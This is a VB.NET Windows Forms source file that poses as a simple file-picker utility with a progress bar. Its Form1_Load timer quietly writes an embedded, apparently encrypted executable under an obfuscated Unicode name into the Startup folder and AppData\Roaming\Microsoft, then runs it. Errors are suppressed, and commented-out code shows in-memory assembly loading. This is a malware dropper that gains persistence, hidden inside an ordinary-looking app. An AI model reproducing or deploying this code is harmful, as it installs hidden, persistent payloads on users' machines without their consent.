﻿Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        OpenFileDialog1.ShowDialog()
        If Windows.Forms.DialogResult.OK Then
            ListView1.Items.Add(System.IO.Path.GetFullPath(OpenFileDialog1.FileName))
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        OpenFileDialog1.ShowDialog()
        If Windows.Forms.DialogResult.OK Then
            ListView2.Items.Add(System.IO.Path.GetFullPath(OpenFileDialog1.FileName))
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ඣ飯ꬡ໒ഞᘚ As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.exe" '  put the name of your server 
        '  Dim ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ As String = Path.GetTempPath  'the path for saving when launching form
        '  IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)


        Dim ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) 'APPDATA\Roaming
        Dim ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)
        Try
            IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)   'APPDATA\Roaming\Microsoft

            IO.File.WriteAllBytes(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕s & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)
        Catch ex As Exception
        End Try

        '   Dim ඣ飯ꬡ໒ഞᘚs As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.Txt"

        '    IO.File.WriteAllText(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚs, My.Resources.String1)

        '  Dim null As Object
        ' System.Reflection.Assembly.Load(My.Resources.ENC5M).EntryPoint.Invoke(null, null)
        Process.Start(ج㜶퉟மꑾஷఘ﨏ցꄭ懲行Ꭿلꬡئនꊫئჰ๕ & "\Microsoft\" & ඣ飯ꬡ໒ഞᘚ)
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Timer2.Start()

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        ProgressBar1.Value = ProgressBar1.Value + 1
        If ProgressBar1.Value = 75 Then
            Form2.Show()
            Timer2.Stop()
        End If
    End Sub
End Class
